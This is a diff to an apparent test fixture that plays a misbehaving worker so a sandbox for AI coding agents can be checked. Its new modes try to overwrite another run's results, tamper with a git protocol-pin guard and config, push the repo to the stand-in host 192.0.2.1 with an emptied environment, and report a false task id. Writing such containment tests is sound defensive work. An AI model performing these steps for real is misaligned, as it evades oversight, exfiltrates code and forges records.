@@ -7,6 +7,8 @@ task instructions:
 - happy:    full event stream, real patch artifact, completed result, exit 0
 - pending:  approval.requested → terminal pending_approval, result, exit 4
 - crash:    task.start then dies without terminal event or result, exit 9
+- crashgate: dies like crash but leaves a v2 resume checkpoint; its resume
+            gates on the shell command ``make check`` (pending, exit 4)
 - hang:     task.start + one heartbeat, then sleeps forever (monitor must kill)
 - envdump:  writes its environment to <workspace>/envdump.json, then happy-min
 - childenv: spawns a grandchild through the worker's REAL child-env boundary
@@ -17,6 +19,14 @@ task instructions:
 - badresult: emits a completed terminal event but writes malformed result JSON
 - unclaimed: happy, but the result's changed_files says [] — the shape of a
             file changed by a shell command the worker never counted (v115-F15)
+- forge:    tries to overwrite another run's result (``victim``) beside its own
+            result directory, records what the sandbox let it do next to
+            --out, then happy-min (W26)
+- gitpush:  the worker tries to edit, delete or replace the repo's
+            skep-protocol-pin and to turn on worktree config, then a
+            grandchild with an EMPTIED env runs ``git push`` over https;
+            all outcomes recorded next to --out (W31), then happy-min
+- wrongid:  happy, but its result envelope names another task id (W26)
 - liar:     claims completed+passed, but the patch contradicts the recorded
             verification command (G10 re-verification must catch the lie)
 - vacuous:  patches like liar, but nominates ``true`` as its own verification
@@ -199,10 +209,76 @@ def main() -> int:
             probe["errno"] = exc.errno
         (args.out.parent / f"netprobe-{task_id}.json").write_text(json.dumps(probe))
 
+    if mode == "forge":
+        attempts: dict[str, object] = {}
+        for target in (
+            args.out.parent.parent / "victim" / "result.json",
+            args.out.parent.parent / "victim.json",
+        ):
+            try:
+                target.write_text('{"forged": true}')
+                attempts[target.name] = "written"
+            except OSError as exc:
+                attempts[target.name] = exc.errno
+        (args.out.parent / f"forge-{task_id}.json").write_text(json.dumps(attempts))
+
+    if mode == "gitpush":
+        import shutil
+        import subprocess
+
+        git_bin = shutil.which("git") or "git"
+
+        def rev_parse(flag: str) -> Path:
+            out = subprocess.run(
+                [git_bin, "rev-parse", flag], cwd=workspace, capture_output=True, text=True
+            ).stdout.strip()
+            return Path(out) if Path(out).is_absolute() else Path(workspace, out)
+
+        git_dir = rev_parse("--absolute-git-dir")
+        pin = rev_parse("--git-common-dir") / "skep-protocol-pin"
+        decoy = git_dir / "decoy"
+        unpin = "[protocol]\n\tallow = always\n"
+        tries: dict[str, object] = {}
+
+        def replace() -> None:
+            decoy.write_text(unpin)
+            os.replace(decoy, pin)
+
+        def shared_config() -> None:
+            with Path(pin.parent, "config").open("a") as config:
+                config.write("[extensions]\n\tworktreeConfig = true\n")
+
+        for name, attempt in (
+            ("edit", lambda: pin.write_text(unpin)),
+            ("unlink", pin.unlink),
+            ("replace", replace),
+            ("shared_config", shared_config),
+        ):
+            try:
+                attempt()
+                tries[name] = "done"
+            except OSError as exc:
+                tries[name] = exc.errno
+        # Its own git dir is writable: a config.worktree there is ignored while
+        # the shared config leaves extensions.worktreeConfig off.
+        Path(git_dir, "config.worktree").write_text(unpin)
+        pushed = subprocess.run(
+            [git_bin, "push", "https://192.0.2.1/x.git", "HEAD:refs/heads/x"],
+            cwd=workspace,
+            env={},  # what `env -i` or subprocess.run(env={}) hands git
+            capture_output=True,
+            text=True,
+            timeout=60,
+        )
+        (args.out.parent / f"gitpush-{task_id}.json").write_text(
+            json.dumps({"rc": pushed.returncode, "stderr": pushed.stderr, **tries})
+        )
+
     approval_verdict = task.get("approval_verdict")
     resumed_with_approval = isinstance(approval_verdict, dict) and approval_verdict.get("approved")
 
-    if mode == "pending" and not resumed_with_approval:
+    crash_first = mode == "crashgate" and task.get("resume_of") is None
+    if mode in {"pending", "crashgate"} and not resumed_with_approval:
         # Leave evidence of in-flight work plus a v2 resume checkpoint so the
         # supervisor can resume this exact worktree in-place.
         (workspace / "pending-marker.txt").write_text("suspended here\n")
@@ -230,10 +306,19 @@ def main() -> int:
                 }
             )
         )
-        stream.emit(
-            "approval.requested",
-            {"action": "git_commit", "reason": "instructions asked for a commit"},
-        )
+        if crash_first:
+            return 9
+        gate: dict[str, object] = {
+            "action": "git_commit",
+            "reason": "instructions asked for a commit",
+        }
+        if mode == "crashgate":
+            gate = {
+                "action": "shell.run",
+                "reason": "shell.run requires approval for command: make check",
+                "commands": [["make", "check"]],
+            }
+        stream.emit("approval.requested", gate)
         stream.emit(
             "task.terminal",
             {"status": "pending_approval", "summary": "stopped for approval"},
@@ -329,6 +414,8 @@ def main() -> int:
             },
         ],
     )
+    if mode == "wrongid":
+        result["task_id"] = "someone-elses-task"
     args.out.write_text(json.dumps(result))
     return 0
 
